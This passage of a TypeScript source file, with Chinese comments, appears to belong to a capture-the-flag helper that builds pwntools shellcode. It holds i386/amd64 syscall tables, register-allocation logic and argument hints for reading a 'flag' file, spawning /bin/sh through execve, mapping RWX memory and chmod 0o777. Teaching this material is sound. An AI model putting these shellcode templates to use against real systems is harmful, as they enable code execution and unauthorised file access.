 "stat64":ARG64["stat"].join("|"), "lstat64":ARG64["lstat"].join("|"), "fstat64":ARG64["fstat"].join("|"),
 "fstatat64":ARG64["newfstatat"].join("|"), "fcntl64":ARG64["fcntl"].join("|"),
 "statfs64":ARG64["statfs"].join("|"), "fstatfs64":ARG64["fstatfs"].join("|"),
 "clone":"unsigned long clone_flags|unsigned long newsp|int *parent_tidptr|unsigned long tls|int *child_tidptr",
 "select":"int n|fd_set *inp|fd_set *outp|fd_set *exp|struct timeval *tvp",
 "oldselect":"int n|fd_set *inp|fd_set *outp|fd_set *exp|struct timeval *tvp",
 "sigaction":"int sig|const struct sigaction *act|struct sigaction *oact",
 "sigsuspend":"old_sigset_t mask",
 "sigpending":"old_sigset_t *uset",
 "sigprocmask":"int how|old_sigset_t *nset|old_sigset_t *oset",
 "mmap":"struct mmap_arg_struct *arg",
 "ipc":"unsigned int call|int first|unsigned long second|unsigned long third|void *ptr|long fifth",
 "_llseek":"unsigned int fd|unsigned long offset_high|unsigned long offset_low|loff_t *result|unsigned int whence",
 "truncate64":"const char *path|loff_t length",
 "ftruncate64":"unsigned int fd|loff_t length",
 "sendfile64":ARG64["sendfile"].join("|"),
 "set_thread_area":"struct user_desc *u_info",
 "get_thread_area":"struct user_desc *u_info",
 "fadvise64_64":"int fd|loff_t offset|loff_t len|int advice",
 "ugetrlimit":ARG64["getrlimit"].join("|"),
 "stime":"time_t *tloc",
 "nice":"int increment",
 "clock_gettime64":ARG64["clock_gettime"].join("|"), "clock_settime64":ARG64["clock_settime"].join("|"),
 "clock_adjtime64":ARG64["clock_adjtime"].join("|"), "timer_gettime64":ARG64["timer_gettime"].join("|"),
 "timer_settime64":ARG64["timer_settime"].join("|"), "clock_getres_time64":ARG64["clock_getres"].join("|"),
 "clock_nanosleep_time64":ARG64["clock_nanosleep"].join("|"), "timerfd_gettime64":ARG64["timerfd_gettime"].join("|"),
 "timerfd_settime64":ARG64["timerfd_settime"].join("|"), "utimensat_time64":ARG64["utimensat"].join("|"),
 "pselect6_time64":ARG64["pselect6"].join("|"), "ppoll_time64":ARG64["ppoll"].join("|"),
 "io_pgetevents_time64":ARG64["io_pgetevents"].join("|"), "recvmmsg_time64":ARG64["recvmmsg"].join("|"),
 "mq_timedsend_time64":ARG64["mq_timedsend"].join("|"), "mq_timedreceive_time64":ARG64["mq_timedreceive"].join("|"),
 "semtimedop_time64":ARG64["semtimedop"].join("|"), "rt_sigtimedwait_time64":ARG64["rt_sigtimedwait"].join("|"),
 "futex_time64":ARG64["futex"].join("|"), "sched_rr_get_interval_time64":ARG64["sched_rr_get_interval"].join("|")
};
// NR32 口径（Node 实测）：字面 380 条 = 0–386 段 350 条 + 393–423 段 30 条；
// 0–386 段缺 37 个号：31 个历史号（19 个无实现、12 个旧 ABI）+ 222、223、251、285 共 4 个未分配 + 149、253（有名无实现、调用只返回 -ENOSYS，已删），
// 19 = 18 空表项（不含 253）+ 134 bdflush；单列对为 149、253。
// 393–423 段缺 415（未分配）；0–423 未分配空号共 11 个：222、223、251、285、387–392、415。
// 其后 SYS64.forEach 把 ≥424 共用号 push 进来（49 条，424–472），NR32.length=429；
// NR32_KEEP 再去重 19 个旧号（16 位版 uid/gid 等），SYS32.length=429-19=410。
// 只改字面量时，380/49/19/410 四个数要同步改，否则注释先过期。
// 382 是 v19 删 149 _sysctl / 253 lookup_dcookie 之前的字面数，删后 380；别拿 382 当现行数。
var NR32: NumberEntry[] = [[0,"restart_syscall"],[1,"exit"],[2,"fork"],[3,"read"],[4,"write"],[5,"open"],[6,"close"],[7,"waitpid"],[8,"creat"],[9,"link"],[10,"unlink"],[11,"execve"],[12,"chdir"],[13,"time"],[14,"mknod"],[15,"chmod"],[16,"lchown"],[19,"lseek"],[20,"getpid"],[21,"mount"],[22,"umount"],[23,"setuid"],[24,"getuid"],[25,"stime"],[26,"ptrace"],[27,"alarm"],[29,"pause"],[30,"utime"],[33,"access"],[34,"nice"],[36,"sync"],[37,"kill"],[38,"rename"],[39,"mkdir"],[40,"rmdir"],[41,"dup"],[42,"pipe"],[43,"times"],[45,"brk"],[46,"setgid"],[47,"getgid"],[49,"geteuid"],[50,"getegid"],[51,"acct"],[52,"umount2"],[54,"ioctl"],[55,"fcntl"],[57,"setpgid"],[60,"umask"],[61,"chroot"],[62,"ustat"],[63,"dup2"],[64,"getppid"],[65,"getpgrp"],[66,"setsid"],[67,"sigaction"],[70,"setreuid"],[71,"setregid"],[72,"sigsuspend"],[73,"sigpending"],[74,"sethostname"],[75,"setrlimit"],[76,"getrlimit"],[77,"getrusage"],[78,"gettimeofday"],[79,"settimeofday"],[80,"getgroups"],[81,"setgroups"],[82,"oldselect"],[83,"symlink"],[85,"readlink"],[87,"swapon"],[88,"reboot"],[90,"mmap"],[91,"munmap"],[92,"truncate"],[93,"ftruncate"],[94,"fchmod"],[95,"fchown"],[96,"getpriority"],[97,"setpriority"],[99,"statfs"],[100,"fstatfs"],[101,"ioperm"],[102,"socketcall"],[103,"syslog"],[104,"setitimer"],[105,"getitimer"],[106,"stat"],[107,"lstat"],[108,"fstat"],[110,"iopl"],[111,"vhangup"],[114,"wait4"],[115,"swapoff"],[116,"sysinfo"],[117,"ipc"],[118,"fsync"],[119,"sigreturn"],[120,"clone"],[121,"setdomainname"],[122,"uname"],[123,"modify_ldt"],[124,"adjtimex"],[125,"mprotect"],[126,"sigprocmask"],[128,"init_module"],[129,"delete_module"],[131,"quotactl"],[132,"getpgid"],[133,"fchdir"],[135,"sysfs"],[136,"personality"],[138,"setfsuid"],[139,"setfsgid"],[140,"_llseek"],[141,"getdents"],[142,"select"],[143,"flock"],[144,"msync"],[145,"readv"],[146,"writev"],[147,"getsid"],[148,"fdatasync"],[150,"mlock"],[151,"munlock"],[152,"mlockall"],[153,"munlockall"],[154,"sched_setparam"],[155,"sched_getparam"],[156,"sched_setscheduler"],[157,"sched_getscheduler"],[158,"sched_yield"],[159,"sched_get_priority_max"],[160,"sched_get_priority_min"],[161,"sched_rr_get_interval"],[162,"nanosleep"],[163,"mremap"],[164,"setresuid"],[165,"getresuid"],[168,"poll"],[170,"setresgid"],[171,"getresgid"],[172,"prctl"],[173,"rt_sigreturn"],[174,"rt_sigaction"],[175,"rt_sigprocmask"],[176,"rt_sigpending"],[177,"rt_sigtimedwait"],[178,"rt_sigqueueinfo"],[179,"rt_sigsuspend"],[180,"pread64"],[181,"pwrite64"],[182,"chown"],[183,"getcwd"],[184,"capget"],[185,"capset"],[186,"sigaltstack"],[187,"sendfile"],[190,"vfork"],[191,"ugetrlimit"],[192,"mmap2"],[193,"truncate64"],[194,"ftruncate64"],[195,"stat64"],[196,"lstat64"],[197,"fstat64"],[198,"lchown"],[199,"getuid"],[200,"getgid"],[201,"geteuid"],[202,"getegid"],[203,"setreuid"],[204,"setregid"],[205,"getgroups"],[206,"setgroups"],[207,"fchown"],[208,"setresuid"],[209,"getresuid"],[210,"setresgid"],[211,"getresgid"],[212,"chown"],[213,"setuid"],[214,"setgid"],[215,"setfsuid"],[216,"setfsgid"],[217,"pivot_root"],[218,"mincore"],[219,"madvise"],[220,"getdents64"],[221,"fcntl64"],[224,"gettid"],[225,"readahead"],[226,"setxattr"],[227,"lsetxattr"],[228,"fsetxattr"],[229,"getxattr"],[230,"lgetxattr"],[231,"fgetxattr"],[232,"listxattr"],[233,"llistxattr"],[234,"flistxattr"],[235,"removexattr"],[236,"lremovexattr"],[237,"fremovexattr"],[238,"tkill"],[239,"sendfile64"],[240,"futex"],[241,"sched_setaffinity"],[242,"sched_getaffinity"],[243,"set_thread_area"],[244,"get_thread_area"],[245,"io_setup"],[246,"io_destroy"],[247,"io_getevents"],[248,"io_submit"],[249,"io_cancel"],[250,"fadvise64"],[252,"exit_group"],[254,"epoll_create"],[255,"epoll_ctl"],[256,"epoll_wait"],[257,"remap_file_pages"],[258,"set_tid_address"],[259,"timer_create"],[260,"timer_settime"],[261,"timer_gettime"],[262,"timer_getoverrun"],[263,"timer_delete"],[264,"clock_settime"],[265,"clock_gettime"],[266,"clock_getres"],[267,"clock_nanosleep"],[268,"statfs64"],[269,"fstatfs64"],[270,"tgkill"],[271,"utimes"],[272,"fadvise64_64"],[274,"mbind"],[275,"get_mempolicy"],[276,"set_mempolicy"],[277,"mq_open"],[278,"mq_unlink"],[279,"mq_timedsend"],[280,"mq_timedreceive"],[281,"mq_notify"],[282,"mq_getsetattr"],[283,"kexec_load"],[284,"waitid"],[286,"add_key"],[287,"request_key"],[288,"keyctl"],[289,"ioprio_set"],[290,"ioprio_get"],[291,"inotify_init"],[292,"inotify_add_watch"],[293,"inotify_rm_watch"],[294,"migrate_pages"],[295,"openat"],[296,"mkdirat"],[297,"mknodat"],[298,"fchownat"],[299,"futimesat"],[300,"fstatat64"],[301,"unlinkat"],[302,"renameat"],[303,"linkat"],[304,"symlinkat"],[305,"readlinkat"],[306,"fchmodat"],[307,"faccessat"],[308,"pselect6"],[309,"ppoll"],[310,"unshare"],[311,"set_robust_list"],[312,"get_robust_list"],[313,"splice"],[314,"sync_file_range"],[315,"tee"],[316,"vmsplice"],[317,"move_pages"],[318,"getcpu"],[319,"epoll_pwait"],[320,"utimensat"],[321,"signalfd"],[322,"timerfd_create"],[323,"eventfd"],[324,"fallocate"],[325,"timerfd_settime"],[326,"timerfd_gettime"],[327,"signalfd4"],[328,"eventfd2"],[329,"epoll_create1"],[330,"dup3"],[331,"pipe2"],[332,"inotify_init1"],[333,"preadv"],[334,"pwritev"],[335,"rt_tgsigqueueinfo"],[336,"perf_event_open"],[337,"recvmmsg"],[338,"fanotify_init"],[339,"fanotify_mark"],[340,"prlimit64"],[341,"name_to_handle_at"],[342,"open_by_handle_at"],[343,"clock_adjtime"],[344,"syncfs"],[345,"sendmmsg"],[346,"setns"],[347,"process_vm_readv"],[348,"process_vm_writev"],[349,"kcmp"],[350,"finit_module"],[351,"sched_setattr"],[352,"sched_getattr"],[353,"renameat2"],[354,"seccomp"],[355,"getrandom"],[356,"memfd_create"],[357,"bpf"],[358,"execveat"],[359,"socket"],[360,"socketpair"],[361,"bind"],[362,"connect"],[363,"listen"],[364,"accept4"],[365,"getsockopt"],[366,"setsockopt"],[367,"getsockname"],[368,"getpeername"],[369,"sendto"],[370,"sendmsg"],[371,"recvfrom"],[372,"recvmsg"],[373,"shutdown"],[374,"userfaultfd"],[375,"membarrier"],[376,"mlock2"],[377,"copy_file_range"],[378,"preadv2"],[379,"pwritev2"],[380,"pkey_mprotect"],[381,"pkey_alloc"],[382,"pkey_free"],[383,"statx"],[384,"arch_prctl"],[385,"io_pgetevents"],[386,"rseq"],[393,"semget"],[394,"semctl"],[395,"shmget"],[396,"shmctl"],[397,"shmat"],[398,"shmdt"],[399,"msgget"],[400,"msgsnd"],[401,"msgrcv"],[402,"msgctl"],[403,"clock_gettime64"],[404,"clock_settime64"],[405,"clock_adjtime64"],[406,"clock_getres_time64"],[407,"clock_nanosleep_time64"],[408,"timer_gettime64"],[409,"timer_settime64"],[410,"timerfd_gettime64"],[411,"timerfd_settime64"],[412,"utimensat_time64"],[413,"pselect6_time64"],[414,"ppoll_time64"],[416,"io_pgetevents_time64"],[417,"recvmmsg_time64"],[418,"mq_timedsend_time64"],[419,"mq_timedreceive_time64"],[420,"semtimedop_time64"],[421,"rt_sigtimedwait_time64"],[422,"futex_time64"],[423,"sched_rr_get_interval_time64"]];
SYS64.forEach(function(s){ if(s.nr>=424) NR32.push([s.nr, s.name]); });
// i386 同名调用有旧 16 位版和 *32 版两套号（如 getuid 24 是旧版、199 才是现在的 getuid32）：按名查找必须返回 *32 版，所以建表时把旧号去掉，只留 190-220 段的现代号
var NR32_KEEP = (function(){
  var byName: Record<string, NumberEntry[]> = {}; NR32.forEach(function(p){ (byName[p[1]]=byName[p[1]]||[]).push(p); });
  var drop: Record<string, number> = {};
  Object.keys(byName).forEach(function(n){
    var arr=byName[n]; if(arr.length<2) return;
    var modern=arr.filter(function(p){return p[0]>=190 && p[0]<=220;});
    if(modern.length) arr.forEach(function(p){ if(p!==modern[0]) drop[p[0]+":"+n]=1; });
  });
  return NR32.filter(function(p){ return !drop[p[0]+":"+p[1]]; });
})();
var SYS32 = NR32_KEEP.map(function(p){
  var a = ARGS32[p[1]] ? ARGS32[p[1]].split("|") : (ARG64[p[1]] ? ARG64[p[1]].slice() : []);
  return {nr:p[0], name:p[1], args:a};
}).sort(function(a,b){return a.nr-b.nr;});
var REGS64 = ["rdi","rsi","rdx","r10","r8","r9"];
var REGS32 = ["ebx","ecx","edx","esi","edi","ebp"];
var REGMAP32: Record<string, string> = {rax:"eax",rbx:"ebx",rcx:"ecx",rdx:"edx",rsi:"esi",rdi:"edi",rbp:"ebp",rsp:"esp",r13:"edi",r12:"esi",r14:"ebp"};
function archPath(){ return "shellcraft."+arch+".linux"; }
function spReg(){ return arch==="i386" ? "esp" : "rsp"; }
function saveReg(){ return arch==="i386" ? "edi" : "r13"; }
function saveReg2(){ return arch==="i386" ? "ebp" : "r14"; }
function saveRegFor(k: number){ return k===2 ? saveReg2() : saveReg(); }
function axReg(){ return arch==="i386" ? "eax" : "rax"; }
function physOf(canon: string){ return arch==="i386" ? (REGMAP32[canon]||canon) : canon; }
// i386 的参数寄存器只有 ebx/ecx/edx/esi/edi/ebp 六个，全被参数占着时没有空闲寄存器可存字符串指针：
// 保存寄存器只能挑「下标 ≥ 参数个数」的，也就是这个调用根本用不到的寄存器（shellcraft.syscall 只会设置传进去的那几个参数，超出的寄存器不会动）。
// amd64 的 r13/r14/r15 不是参数寄存器，永远安全，不用挑。
function freeSaveCanons(sys: Syscall){
  if(arch!=="i386") return ["r13","r14","r15"];
  var cand: [number, string][]=[[5,"r14"],[4,"r13"],[3,"r12"],[2,"rdx"],[1,"rcx"],[0,"rbx"]], out: string[]=[];
  cand.forEach(function(c){ if(c[0]>=sys.args.length) out.push(c[1]); });
  return out;
}
// 第 k 个字符串（k 从 0 起）的保存寄存器（规范名，显示时再换算）：第 0 个用栈顶，后面的用空闲寄存器。
// i386 的 mount 有 5 个参数、只剩 ebp 一个空闲寄存器，第 3 个字符串（type）没有空闲寄存器可存，规范名先给 rdi（edi），
// 生成时不走 shellcraft.syscall、改走手动 mov 顺序（见 buildFullCode 的 mountManual32），edi 只是暂存、搬进 edx 之后才轮到 data 覆盖它。
function multiCanon(sys: Syscall, k: number){
  if(k===0) return "rsp";
  if(arch!=="i386") return ["r13","r14"][k-1]||"r15";
  var f=freeSaveCanons(sys);
  if(f[k-1]) return f[k-1];
  if(sys.name==="mount" && k===2) return "rdi";
  // 6 参数 i386 调用（如 setxattrat/getxattrat）：6 个参数寄存器全被占，没有空闲寄存器可存字符串指针。
  // 退路：把字符串指针直接放进它自己的最终参数寄存器——压栈后立即 mov 进去，再把这个寄存器本身传给 syscall()。
  // 这样指针以寄存器值的形式进 shellcraft.syscall 的 setregs 依赖图：setregs 看到源=目的会跳过这一步，
  // 其它参数的 mov 也不会覆盖它；比另找暂存寄存器更稳。返回的是规范名，显示/生成时再经 physOf 换算。
  var ownIdx = STR_MULTI[sys.name] && STR_MULTI[sys.name].idx[k];
  if(ownIdx !== undefined){
    var phys = REGS32[ownIdx]; // 该字符串参数最终所在的 i386 寄存器
    var back = {ebx:"rbx",ecx:"rcx",edx:"rdx",esi:"r12",edi:"r13",ebp:"r14"}[phys];
    if(back) return back;
  }
  return null;
}
function str2Canon(sys: Syscall){ if(arch!=="i386") return "r13"; var f=freeSaveCanons(sys); return f[0]||"r13"; }
function archText(t: string){
  if(arch!=="i386" || !t) return t;
  return t.replace(/\brax\b/g,"eax").replace(/\brsp\b/g,"esp").replace(/\br13\b/g,"edi").replace(/\br14\b/g,"ebp").replace(/\br12\b/g,"esi").replace(/\brdi\b/g,"edi").replace(/\brbp\b/g,"ebp");
}
function dispVal(v: string){ // 输入框里显示的寄存器名按当前架构换算（i386 没有 rax/rsp/r13）
  if(arch!=="i386") return v;
  var unq=(v||"").replace(/^'|'$/g,"");
  return REGMAP32[unq] || v;
}
function argName(a: string){var p=a.trim().split(/\s+/);return p[p.length-1].replace(/^\*/,"");}
function argType(a: string){var n=argName(a);var t=a.trim();var i=t.lastIndexOf(n);return t.slice(0,i).trim();}

// 每个参数的来源说明：[类别, 说明, 快捷填入[]]
var HINTS: Record<string, Hint> ={
 "write:fd":["fix","固定值：输出到终端填 1，报错输出填 2",["1","2","0"]],
 "write:buf":["rax","指针：数据在哪就填哪。上一步 mmap 返回的地址还在 rax 里就填 'rax'；数据在栈上填 'rsp'",["'rax'","'rsp'","'r13'"]],
 "write:count":["len","表里这里只给类型 size_t，给不出具体数——数取决于你要写的数据到底有多少字节。下面三个来源选一个：跟上一步一样 / 用上一步返回值（read 读了多少就写多少）/ 已知固定长度自己填（如要写 5 字节字符串就填 5）",["0x100","0x1000","0x30"]],
 "read:fd":["fix","固定值 / 上一步返回：读终端填 0，读文件填 open 返回的 fd（在 rax 里）",["0","'rax'","3"]],
 "read:buf":["rax","指针：读到哪块内存。最常用 'rsp'（栈顶），或 mmap 返回的地址",["'rsp'","'rax'","'r13'"]],
 "read:count":["len","表里这里只给类型 size_t，给不出具体数——数取决于你最多想读多少字节（缓冲区装得下多少）。下面三个来源选一个：跟上一步一样 / 用上一步返回值 / 已知固定长度自己填（如只读 5 字节就填 5）",["0x100","0x1000"]],
 "pwrite64:count":["len","表里这里只给类型 size_t，给不出具体数——数取决于你要写的数据到底有多少字节。下面三个来源选一个：跟上一步一样 / 用上一步返回值 / 已知固定长度自己填（如写 5 字节字符串就填 5）",["0x100","0x1000"]],
 "pwrite64:fd":["rax","fd 来源：上一步 open 返回的 fd 还在 rax 里填 'rax'，或 0/1/2",["'rax'","1"]],
 "pwrite64:buf":["rax","数据缓冲区指针：数据在栈上填 'rsp'，在 mmap 地址填 'rax'/已保存的寄存器，不用 pushstr",["'rsp'","'rax'"]],
 "pwrite64:pos":["fix","写到文件的哪个偏移：从文件头写填 0",["0"]],
 "pread64:count":["len","表里只给类型 size_t，给不出具体数——取决于你最多想读多少字节。下面三个来源选一个",["0x100","0x1000"]],
 "writev:vlen":["cnt","段数，不是字节数！vec 那张表格里有几行就填几：只写一段数据就填 1。下面点选直接填",["1","2","3"]],
 "readv:vlen":["cnt","段数，不是字节数！vec 那张表格里有几行就填几：只读一段数据就填 1。下面点选直接填",["1","2","3"]],
 "readv:vec":["vec","vec 不是数据本身！它指向一张 iovec 小表格（每行 = 数据地址 + 数据长度），内核照着表格去读。下面面板有现成搭法，搭完填表格地址",["'rsp'"]],
 "writev:vec":["vec","vec 不是数据本身！它指向一张 iovec 小表格（每行 = 数据地址 + 数据长度），内核照着表格去写。下面面板有现成搭法，搭完填表格地址",["'rsp'"]],
 "preadv:vec":["vec","vec 不是数据本身！它指向一张 iovec 小表格（每行 = 数据地址 + 数据长度）。下面面板有现成搭法，搭完填表格地址",["'rsp'"]],
 "pwritev:vec":["vec","vec 不是数据本身！它指向一张 iovec 小表格（每行 = 数据地址 + 数据长度）。下面面板有现成搭法，搭完填表格地址",["'rsp'"]],
 "mmap:addr":["fix","固定值：填 0 让内核自己选地址",["0"]],
 "mmap:len":["len","自己定长度：映射多少字节，一页是 0x1000",["0x1000","0x100"]],
 "mmap:prot":["cons","常量查表：PROT_READ=1, WRITE=2, EXEC=4，可相加，RWX=7",["1","3","7"]],
 "mmap:flags":["cons","常量查表：MAP_PRIVATE=2，MAP_ANONYMOUS=0x20，匿名私有=0x22。注意配对：flags 含 0x20（匿名）时 fd 必须改填 -1，匿名映射不需要 fd；只有文件映射（flags 不含 0x20，如 2）才填 open 返回的 'rax'。本页 open→mmap→write 模板默认就是文件映射：flags=2 + fd='rax'，别单独把 flags 改成 0x22 而不改 fd。",["2","0x22","1"]],
 "mmap:fd":["rax","上一步 rax 返回：open 返回的 fd 还在 rax 里就填 'rax'；匿名映射填 -1",["'rax'","-1","3"]],
 "mmap:off":["fix","固定值：从文件开头映射填 0",["0"]],
 "open:filename":["str","字符串指针，不能直填字符串、更不是长度！本页已自动生成 pushstr（上面框里填路径，默认 flag），这里传 'rsp'；或改用 shellcraft.open('flag',0,0) 封装",["'rsp'"]],
 "open:flags":["cons","打开方式（可相加）：O_RDONLY=0 只读, O_WRONLY=1 只写, O_RDWR=2 读写, O_CREAT=0x40 不存在就创建, O_APPEND=0x400 追加写",["0","2","0x40"]],
 "open:mode":["cons","只有 flags 带 O_CREAT(0x40) 时才生效：新文件的权限，八进制填，如 0o644（rw-r--r--）/ 0o755；不带 O_CREAT 时填 0 占位",["0","0o644","0o755"]],
 "openat:dfd":["fix","固定值：相对当前目录填 -100 (AT_FDCWD)",["-100"]],
 "openat:filename":["str","字符串指针，不能直填字符串！本页已自动生成 pushstr（上面框里填路径），这里传 'rsp'；或用 shellcraft.openat(-100,'flag',0) 封装",["'rsp'"]],
 "openat:flags":["cons","打开方式（可相加）：O_RDONLY=0 只读, O_RDWR=2 读写, O_CREAT=0x40 不存在就创建",["0","2"]],
 "openat:mode":["cons","只有 flags 带 O_CREAT(0x40) 时才生效：新文件权限八进制 0o644 / 0o755；否则填 0",["0","0o644"]],
 "mprotect:start":["rax","指针：要改权限的地址，常是 mmap 返回值（在 rax / 已存的寄存器里）",["'rax'","'rsp'","'r13'"]],
 "mprotect:len":["len","自己定长度：一页 0x1000",["0x1000"]],
 "mprotect:prot":["cons","常量查表：RWX 填 7",["7","3","1"]],
 "sendfile:out_fd":["fix","固定值：输出到终端填 1",["1"]],
 "sendfile:in_fd":["rax","上一步 rax 返回：open 返回的 fd",["'rax'","3"]],
 "sendfile:offset":["fix","固定值：填 0 表示用并更新文件偏移",["0"]],
 "sendfile:count":["len","自己定长度：发送多少字节",["0x100","0x1000"]],
 "close:fd":["rax","上一步 rax 返回 / 固定值：要关哪个 fd",["'rax'","3","1"]],
 "exit:error_code":["fix","固定值：正常退出填 0",["0"]],
 "exit_group:error_code":["fix","固定值：正常退出填 0",["0"]],
 "execve:filename":["str","字符串指针，不能直填字符串！本页已自动生成 pushstr（上面框里填要执行的程序路径，默认 /bin/sh），这里传 'rsp'",["'rsp'"]],
 "execve:argv":["fix","固定值：不需要参数数组时填 0（NULL）",["0"]],
 "execve:envp":["fix","固定值：不需要环境变量时填 0（NULL）",["0"]],
 "chmod:filename":["str","字符串指针，要改权限的文件路径。不能直填字符串、更不是长度！本页已自动生成 pushstr（上面框里填路径，默认 flag），这里传 'rsp'",["'rsp'"]],
 "chmod:mode":["cons","权限位，用八进制填（带 0o 前缀，别写成十进制 777）：每位 = 读4+写2+执行1，三位依次是属主/组/其他。0o777=rwxrwxrwx 全开（改 flag 权限最常用），0o755=rwxr-xr-x，0o644=rw-r--r--，0o600=rw-------",["0o777","0o755","0o644","0o600"]],
 "fchmod:fd":["rax","fd 来源：上一步 open 返回的 fd 还在 rax 里填 'rax'；已保存到别的寄存器就填那个寄存器",["'rax'","3"]],
 "fchmod:mode":["cons","权限位，八进制（带 0o）：0o777=rwxrwxrwx，0o755=rwxr-xr-x，0o644=rw-r--r--，0o600=rw-------。每位 = 读4+写2+执行1",["0o777","0o755","0o644"]],
 "fchmodat:filename":["str","字符串指针：本页已自动 pushstr（上面框里填路径），这里传 'rsp'",["'rsp'"]],
 "fchmodat:mode":["cons","权限位，八进制（带 0o）：0o777 全开，0o755，0o644。每位 = 读4+写2+执行1",["0o777","0o755","0o644"]],
 "fchmodat2:filename":["str","字符串指针：本页已自动 pushstr（上面框里填路径），这里传 'rsp'",["'rsp'"]],
 "fchmodat2:mode":["cons","权限位，八进制（带 0o）：0o777 全开，0o755，0o644。每位 = 读4+写2+执行1",["0o777","0o755","0o644"]],
 "chown:filename":["str","字符串指针，要改属主的文件路径。本页已自动 pushstr（上面框里填路径），这里传 'rsp'",["'rsp'"]],
 "chown:user":["fix","新属主的 uid 数字：0=root，1000=常见普通用户（VM 里 id 命令能看自己的 uid）；填 -1 表示属主不改",["0","1000","-1"]],
 "chown:group":["fix","新属组的 gid 数字：0=root 组，1000=常见用户组（id 命令看）；填 -1 表示属组不改",["0","1000","-1"]],
 "lchown:filename":["str","字符串指针（不跟随符号链接）：本页已自动 pushstr，这里传 'rsp'",["'rsp'"]],
 "lchown:user":["fix","uid 数字：0=root，1000=普通用户；-1 表示不改",["0","1000","-1"]],
 "lchown:group":["fix","gid 数字：0=root 组，1000=普通组；-1 表示不改",["0","1000","-1"]],
 "fchown:fd":["rax","fd 来源：上一步 open 返回的 fd（在 rax 里）",["'rax'","3"]],
 "fchown:user":["fix","uid 数字：0=root，1000=普通用户；-1 表示不改",["0","1000","-1"]],
 "fchown:group":["fix","gid 数字：0=root 组；-1 表示不改",["0","1000","-1"]],
 "mkdir:pathname":["str","字符串指针，要建的目录路径。本页已自动 pushstr（上面框里填路径），这里传 'rsp'",["'rsp'"]],
 "mkdir:mode":["cons","新目录权限，八进制（带 0o）：0o755=rwxr-xr-x（最常用），0o777=rwxrwxrwx 全开，0o700=只有自己能进。每位 = 读4+写2+执行1（目录的 x = 能进入）",["0o755","0o777","0o700"]],
 "mkdirat:pathname":["str","字符串指针：本页已自动 pushstr，这里传 'rsp'",["'rsp'"]],
 "mkdirat:mode":["cons","新目录权限，八进制（带 0o）：0o755 最常用，0o777 全开",["0o755","0o777"]],
 "creat:pathname":["str","字符串指针，要创建的文件路径。本页已自动 pushstr，这里传 'rsp'",["'rsp'"]],
 "creat:mode":["cons","新文件权限，八进制（带 0o）：0o644=rw-r--r--（最常用），0o600=rw-------，0o755 带执行位",["0o644","0o600","0o755"]],
 "rename:oldname":["str","字符串指针，旧路径。本页自动生成：先 pushstr 新名存进保存寄存器，再 pushstr 旧名，所以这里传 'rsp'（上面第一个框填旧路径）",["'rsp'"]],
 "rename:newname":["str","字符串指针，新路径。本页已先把它 pushstr 并 mov 到保存寄存器保存，传参数框里已填好的那个保存寄存器（amd64 是 'r13'；i386 按这个调用没用到的参数寄存器挑）",[]],
 "link:oldname":["str","字符串指针，已有文件的路径：先 pushstr 新名存进保存寄存器，再 pushstr 旧名，这里传 'rsp'",["'rsp'"]],
 "link:newname":["str","字符串指针，新硬链接路径：已 pushstr 并 mov 到保存寄存器保存，传参数框里已填好的那个保存寄存器（amd64 是 'r13'；i386 按这个调用挑空闲寄存器）",[]],
 "symlink:old":["str","字符串指针，链接指向的目标路径（可以不存在）：先 pushstr 新名存进保存寄存器，再 pushstr 目标，这里传 'rsp'",["'rsp'"]],
 "symlink:new":["str","字符串指针，要建的软链接路径：已 pushstr 并 mov 到保存寄存器保存，传参数框里已填好的那个保存寄存器（amd64 是 'r13'；i386 按这个调用挑空闲寄存器）",[]],
 "unlink:pathname":["str","字符串指针，要删的文件路径。本页已自动 pushstr（上面框里填路径），这里传 'rsp'",["'rsp'"]],
 "unlinkat:pathname":["str","字符串指针，要删的文件路径：本页已自动 pushstr，这里传 'rsp'",["'rsp'"]],
 "rmdir:pathname":["str","字符串指针，要删的空目录路径。本页已自动 pushstr，这里传 'rsp'",["'rsp'"]],
 "chdir:filename":["str","字符串指针，要切换到的目录路径。本页已自动 pushstr，这里传 'rsp'",["'rsp'"]],
 "access:filename":["str","字符串指针，要检查的文件路径。本页已自动 pushstr，这里传 'rsp'",["'rsp'"]],
 "access:mode":["cons","检查什么（可相加）：F_OK=0 只看文件存不存在，X_OK=1 能不能执行，W_OK=2 能不能写，R_OK=4 能不能读。如 6 = 可读+可写",["0","4","2","1","6"]],
 "faccessat:filename":["str","字符串指针：本页已自动 pushstr，这里传 'rsp'",["'rsp'"]],
 "faccessat:mode":["cons","检查什么（可相加）：F_OK=0 存在，X_OK=1 可执行，W_OK=2 可写，R_OK=4 可读",["0","4","2","1"]],
 "stat:filename":["str","字符串指针，要查信息的文件路径。本页已自动 pushstr，这里传 'rsp'",["'rsp'"]],
 "stat:statbuf":["rax","输出缓冲区指针：内核把文件信息写到这个地址。填一块可写内存，如 mmap 返回的地址（先存到 r13 再填 'r13'），别和文件名共用 rsp",["'r13'","'rax'"]],
 "lstat:filename":["str","字符串指针（不跟随符号链接）：本页已自动 pushstr，这里传 'rsp'",["'rsp'"]],
 "lstat:statbuf":["rax","输出缓冲区指针：填一块可写内存地址，如 'r13'（mmap 返回并保存的地址）",["'r13'","'rax'"]],
 "newfstatat:filename":["str","字符串指针：本页已自动 pushstr，这里传 'rsp'",["'rsp'"]],
 "newfstatat:statbuf":["rax","输出缓冲区指针：填一块可写内存地址，如 'r13'",["'r13'","'rax'"]],
 "readlink:path":["str","字符串指针，软链接的路径。本页已自动 pushstr，这里传 'rsp'",["'rsp'"]],
 "readlink:buf":["rax","输出缓冲区指针：链接目标字符串写到这里，常用 'rsp' 下方留空的位置或 mmap 的地址；和路径同在栈上时注意别覆盖",["'r13'","'rax'"]],
 "readlink:bufsiz":["len","自己定长度：缓冲区最多放多少字节",["0x100","0x1000"]],
 "readlinkat:path":["str","字符串指针，软链接路径：本页已自动 pushstr，这里传 'rsp'",["'rsp'"]],
 "readlinkat:buf":["rax","输出缓冲区指针：填一块可写内存地址，如 'r13'",["'r13'","'rax'"]],
 "readlinkat:bufsiz":["len","自己定长度：缓冲区大小",["0x100","0x1000"]],
 "truncate:path":["str","字符串指针，要截断的文件路径。本页已自动 pushstr，这里传 'rsp'",["'rsp'"]],
 "truncate:length":["len","自己定长度：截断成多少字节，填 0 = 清空文件",["0","0x100"]],
 "ftruncate:fd":["rax","fd 来源：上一步 open 返回的 fd（在 rax 里）",["'rax'","3"]],
 "ftruncate:length":["len","自己定长度：截断成多少字节，填 0 = 清空",["0","0x100"]],
 "lseek:fd":["rax","fd 来源：上一步 open 返回的 fd（在 rax 里），或 0/1/2",["'rax'","0","1"]],
